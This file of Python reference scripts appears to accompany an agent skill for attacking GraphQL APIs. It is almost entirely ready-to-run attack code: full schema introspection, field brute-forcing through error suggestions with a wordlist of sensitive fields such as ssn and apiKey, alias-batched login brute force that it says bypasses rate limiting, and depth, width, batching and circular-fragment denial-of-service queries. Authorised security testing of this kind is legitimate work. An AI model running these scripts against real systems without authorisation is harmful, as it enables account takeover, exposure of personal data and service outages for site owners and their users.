# GraphQL Introspection Attack Scripts

Reference implementations for the workflow in `SKILL.md`. These blocks assume the `TARGET`, `GRAPHQL_URL`, `headers`, and `auth_headers` variables defined in Steps 1-2 of the skill.

## Step 2: Full Introspection Query

```python
GRAPHQL_URL = f"{TARGET}/graphql"
auth_headers = {**headers, "Authorization": "Bearer <token>"}

# Full introspection query to extract complete schema
FULL_INTROSPECTION = {
    "query": """
    query IntrospectionQuery {
      __schema {
        queryType { name }
        mutationType { name }
        subscriptionType { name }
        types {
          ...FullType
        }
        directives {
          name
          description
          locations
          args {
            ...InputValue
          }
        }
      }
    }

    fragment FullType on __Type {
      kind
      name
      description
      fields(includeDeprecated: true) {
        name
        description
        args {
          ...InputValue
        }
        type {
          ...TypeRef
        }
        isDeprecated
        deprecationReason
      }
      inputFields {
        ...InputValue
      }
      interfaces {
        ...TypeRef
      }
      enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
      }
      possibleTypes {
        ...TypeRef
      }
    }

    fragment InputValue on __InputValue {
      name
      description
      type { ...TypeRef }
      defaultValue
    }

    fragment TypeRef on __Type {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
            }
          }
        }
      }
    }
    """
}

resp = requests.post(GRAPHQL_URL, headers=auth_headers, json=FULL_INTROSPECTION)

if resp.status_code == 200:
    schema = resp.json()
    if "data" in schema and "__schema" in schema["data"]:
        print("[VULNERABLE] Full introspection enabled")
        types = schema["data"]["__schema"]["types"]

        # Categorize types
        custom_types = [t for t in types if not t["name"].startswith("__")]
        queries = schema["data"]["__schema"]["queryType"]
        mutations = schema["data"]["__schema"].get("mutationType")

        print(f"\nSchema Summary:")
        print(f"  Custom Types: {len(custom_types)}")
        print(f"  Query Type: {queries['name'] if queries else 'None'}")
        print(f"  Mutation Type: {mutations['name'] if mutations else 'None'}")

        # List all custom types and their fields
        for t in custom_types:
            if t.get("fields"):
                print(f"\n  Type: {t['name']}")
                for field in t["fields"]:
                    field_type = field["type"]["name"] or field["type"].get("ofType", {}).get("name", "")
                    print(f"    - {field['name']}: {field_type}")

        # Save schema for further analysis
        with open("graphql_schema.json", "w") as f:
            json.dump(schema, f, indent=2)
        print("\nSchema saved to graphql_schema.json")
    else:
        print("[SECURED] Introspection disabled or restricted")
        print(f"Response: {resp.text[:500]}")
else:
    print(f"Request failed: {resp.status_code}")
```

## Step 4: Schema Reconstruction When Introspection is Disabled

```python
# Use field suggestion errors to reconstruct the schema
def bruteforce_field(type_name, field_wordlist):
    """Use GraphQL error messages to discover valid fields."""
    discovered_fields = []

    for field_name in field_wordlist:
        query = {"query": f"{{ {type_name} {{ {field_name} }} }}"}
        resp = requests.post(GRAPHQL_URL, headers=auth_headers, json=query)
        response_text = resp.text.lower()

        # GraphQL often suggests valid field names in error messages
        if "did you mean" in response_text:
            # Extract suggestions
            import re
            suggestions = re.findall(r'"(\w+)"', resp.text)
            for s in suggestions:
                if s not in discovered_fields:
                    discovered_fields.append(s)
                    print(f"  [DISCOVERED] {type_name}.{s} (via suggestion)")

        elif resp.status_code == 200 and "errors" not in resp.json():
            discovered_fields.append(field_name)
            print(f"  [VALID] {type_name}.{field_name}")

    return discovered_fields

# Common GraphQL field names wordlist
FIELD_WORDLIST = [
    "id", "name", "email", "username", "password", "role", "token",
    "createdAt", "updatedAt", "status", "type", "description", "title",
    "firstName", "lastName", "phone", "address", "avatar", "bio",
    "isAdmin", "isActive", "permissions", "groups", "orders", "items",
    "price", "quantity", "total", "currency", "paymentMethod",
    "ssn", "dateOfBirth", "creditCard", "bankAccount", "salary",
    "apiKey", "secretKey", "refreshToken", "mfaEnabled", "lastLogin",
]

# Try to discover fields on common type names
for type_name in ["user", "users", "me", "currentUser", "admin", "order", "account"]:
    print(f"\nBrute-forcing fields on '{type_name}':")
    fields = bruteforce_field(type_name, FIELD_WORDLIST)
```

## Step 5: GraphQL Attack Techniques

```python
# Attack 1: Alias-based batching for brute force (bypasses rate limiting)
def alias_brute_force_login(usernames, password="Password123"):
    """Use GraphQL aliases to send multiple login attempts in one request."""
    aliases = []
    for i, username in enumerate(usernames[:100]):  # Max 100 per batch
        aliases.append(f"""
        attempt_{i}: login(username: "{username}", password: "{password}") {{
            token
            user {{ id email }}
        }}
        """)

    query = {"query": "mutation { " + " ".join(aliases) + " }"}
    resp = requests.post(GRAPHQL_URL, headers=headers, json=query)
    if resp.status_code == 200:
        data = resp.json().get("data", {})
        for key, value in data.items():
            if value and value.get("token"):
                print(f"[SUCCESS] {key}: token obtained")
    return resp

# Attack 2: Query depth attack (DoS)
def generate_deep_query(depth=50):
    """Generate a deeply nested query to test depth limits."""
    query = "{ users { friends " * depth
    query += "{ id name }" + " } " * depth + " }"
    return {"query": query}

deep_query = generate_deep_query(20)
resp = requests.post(GRAPHQL_URL, headers=auth_headers, json=deep_query)
print(f"Depth 20 query: {resp.status_code}")
if resp.status_code == 200 and "errors" not in resp.json():
    print("[VULNERABLE] No query depth limit enforced")

# Attack 3: Field duplication attack (resource exhaustion)
def generate_wide_query(width=1000):
    """Repeat expensive fields many times using aliases."""
    fields = " ".join([f"field_{i}: users {{ id email name role }}" for i in range(width)])
    return {"query": "{ " + fields + " }"}

wide_query = generate_wide_query(500)
resp = requests.post(GRAPHQL_URL, headers=auth_headers, json=wide_query)
print(f"Width 500 query: {resp.status_code}")

# Attack 4: Batched queries
batch_queries = [
    {"query": "{ users { id email } }"},
    {"query": "{ orders { id total } }"},
    {"query": "{ admin { settings } }"},
] * 100  # 300 queries in one request

resp = requests.post(GRAPHQL_URL, headers=auth_headers, json=batch_queries)
print(f"Batch 300 queries: {resp.status_code}")

# Attack 5: Circular fragment (DoS)
circular_query = {
    "query": """
    query {
      users {
        ...UserFields
      }
    }
    fragment UserFields on User {
      friends {
        ...UserFields
      }
    }
    """
}
resp = requests.post(GRAPHQL_URL, headers=auth_headers, json=circular_query)
print(f"Circular fragment: {resp.status_code}")
```
